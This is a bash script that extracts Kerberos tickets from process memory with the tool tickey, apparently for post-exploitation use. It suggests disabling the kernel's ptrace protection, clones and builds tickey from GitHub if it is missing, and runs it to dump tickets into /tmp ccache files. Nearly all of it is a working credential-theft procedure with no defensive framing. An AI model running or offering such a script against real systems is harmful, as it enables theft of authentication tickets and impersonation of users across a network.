#!/bin/bash
# Extract Kerberos tickets from process memory using tickey

echo "=== Extracting Tickets from Keyring ==="
echo ""

# Check ptrace protection
echo "Checking ptrace protection:"
if [ -f /proc/sys/kernel/yama/ptrace_scope ]; then
    PTRACE=$(cat /proc/sys/kernel/yama/ptrace_scope)
    echo "ptrace_scope: $PTRACE"
    if [ "$PTRACE" -eq 0 ]; then
        echo "✓ ptrace is enabled - extraction should work"
    else
        echo "✗ ptrace is restricted - extraction may fail"
        echo "  Consider: echo 0 > /proc/sys/kernel/yama/ptrace_scope (requires root)"
    fi
else
    echo "ptrace_scope file not found"
fi
echo ""

# Check if tickey is installed
if [ -f /tmp/tickey ]; then
    echo "tickey found at /tmp/tickey"
else
    echo "tickey not found. Installing..."
    
    # Clone and build tickey
    if [ ! -d tickey ]; then
        git clone https://github.com/TarlogicSecurity/tickey
    fi
    
    cd tickey/tickey
    make CONF=Release
    
    if [ -f /tmp/tickey ]; then
        echo "✓ tickey built successfully"
    else
        echo "✗ Failed to build tickey"
        exit 1
    fi
    cd ../..
fi
echo ""

# Run tickey
echo "Running tickey to extract tickets..."
/tmp/tickey -i
echo ""

# Show extracted tickets
echo "Extracted tickets:"
ls -la /tmp/__krb_*.ccache 2>/dev/null || echo "No tickets extracted"
echo ""

echo "=== Done ==="
